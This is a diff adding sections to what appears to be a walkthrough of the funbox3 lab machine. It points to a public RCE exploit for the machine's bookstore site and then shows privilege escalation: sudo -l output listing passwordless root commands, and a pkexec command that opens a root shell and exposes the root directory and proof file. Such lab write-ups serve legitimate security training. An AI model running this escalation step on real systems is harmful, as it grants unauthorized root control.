@@ -57,3 +57,52 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 2021/11/30 15:42:10 Finished
 ===============================================================
 ```
+
+## Reverse Shell
+http://[IP]/store/ is an online bookstore site. RCE exploit can be found on https://www.exploit-db.com/exploits/47887
+
+## local.txt
+Local.txt was found on /var/www/
+```
+ls -la /var/www
+total 16
+drwxr-xr-x  3 root     root     4096 Oct 30  2020 .
+drwxr-xr-x 14 root     root     4096 Jul 30  2020 ..
+drwxr-xr-x  6 root     root     4096 Jul 31  2020 html
+-rw-r--r--  1 www-data www-data   33 Nov 30 08:35 local.txt
+```
+
+# PrivEsc
+```
+sudo -l
+Matching Defaults entries for tony on funbox3:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User tony may run the following commands on funbox3:
+    (root) NOPASSWD: /usr/bin/yelp
+    (root) NOPASSWD: /usr/bin/dmf
+    (root) NOPASSWD: /usr/bin/whois
+    (root) NOPASSWD: /usr/bin/rlogin
+    (root) NOPASSWD: /usr/bin/pkexec
+    (root) NOPASSWD: /usr/bin/mtr
+    (root) NOPASSWD: /usr/bin/finger
+    (root) NOPASSWD: /usr/bin/time
+    (root) NOPASSWD: /usr/bin/cancel
+    (root) NOPASSWD: /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh
+    
+tony@funbox3:~$ sudo -u root /usr/bin/pkexec /bin/sh
+
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+# ls -la /root
+total 28
+drwx------  3 root root 4096 Nov 30 08:35 .
+drwxr-xr-x 20 root root 4096 Oct 30  2020 ..
+-rw-------  1 root root    0 Oct 30  2020 .bash_history
+-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
+-rw-r--r--  1 root root  161 Dec  5  2019 .profile
+-rw-------  1 root root   33 Nov 30 08:35 proof.txt
+-rw-r--r--  1 root root   32 Oct 30  2020 root.flag
+drwxr-xr-x  3 root root 4096 Jul 30  2020 snap
+```
